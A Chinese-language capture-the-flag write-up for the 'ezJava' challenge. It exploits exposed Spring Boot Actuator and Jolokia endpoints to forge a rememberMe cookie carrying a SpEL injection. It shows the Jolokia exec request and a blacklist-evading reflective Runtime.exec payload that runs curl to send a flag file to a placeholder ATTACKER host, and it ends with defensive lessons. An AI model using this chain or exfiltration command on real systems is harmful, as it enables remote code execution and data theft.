# ezJava

## 题目简述

题目是一个启用了 Spring Boot Actuator 和 Jolokia 的 Java Web 服务。Jolokia 暴露了自定义加密 MBean，可以生成合法的 `rememberMe` Cookie；Cookie 解密后的内容又会进入 SpEL 表达式解析。利用 Actuator 泄露的参数和黑名单规则，绕过字符串过滤后即可执行系统命令。

## 解题过程

访问下面两个 Actuator 端点收集信息：

```text
/actuator/jolokia/list
/actuator/env
```

`jolokia/list` 中可以找到对象名 `com.jqy.ezspel:Name=EncryptService`，它公开了 `encrypt` 操作。`env` 则泄露了调用所需的固定参数以及 SpEL 黑名单。MBean 的调用参数依次为明文、密钥材料和待加密表达式，因此可直接通过 Jolokia 的 `exec` 请求制作服务端认可的 Cookie。

向 `/actuator/jolokia` 发送：

```json
{
  "type": "exec",
  "mbean": "com.jqy.ezspel:Name=EncryptService",
  "operation": "encrypt",
  "arguments": [
    "hgamehgamehgame{",
    "spppelandjookiaa",
    "#{PAYLOAD}"
  ]
}
```

直接写 `java.lang.Runtime`、`getRuntime` 和 `exec` 会命中黑名单。过滤发生在字符串层，而 SpEL 支持字符串拼接和反射，因此可以把敏感词拆开，并从系统类加载器获取 `Runtime`：

```java
#{T(ClassLoader).getSystemClassLoader()
  .loadClass('java.l'+'ang.Ru'+'ntime')
  .getMethod('ex'+'ec',T(String[]))
  .invoke(
    T(ClassLoader).getSystemClassLoader()
      .loadClass('java.l'+'ang.Ru'+'ntime')
      .getMethod('getRu'+'ntime')
      .invoke(null),
    new String[]{
      '/bin/bash',
      '-c',
      'curl http://ATTACKER/?flag=$(cat flag)'
    }
  )}
```

上面的表达式做了三件事：

1. 拼接得到 `java.lang.Runtime`，避开完整类名匹配；
2. 通过反射取得 `getRuntime()` 返回的实例；
3. 调用接收 `String[]` 的 `exec` 重载，以 `/bin/bash -c` 执行外带命令。

Jolokia 返回的是加密结果。把它写入站点使用的 `rememberMe` Cookie 后重新请求业务页面，服务端会解密 Cookie 并解析其中的 SpEL，命令执行后 flag 被发送到监听端。实际复现时应对 Cookie 值做符合 HTTP 语法的 URL 编码，并根据目标环境修正 flag 文件路径。

## 方法总结

- 利用链由 Actuator 信息泄露、Jolokia MBean 任意调用、合法 Cookie 构造和 SpEL 注入组成，单独看到某一个端点还不足以完成利用。
- 黑名单只匹配连续字符串，无法阻止 SpEL 的拼接、反射和类加载；应避免对不可信数据求值，而不是继续堆叠关键词。
- 生产环境应关闭不必要的 Actuator/Jolokia 端点，限制管理端点的网络和身份访问，并使用不可解释为表达式的结构化 Cookie 数据。
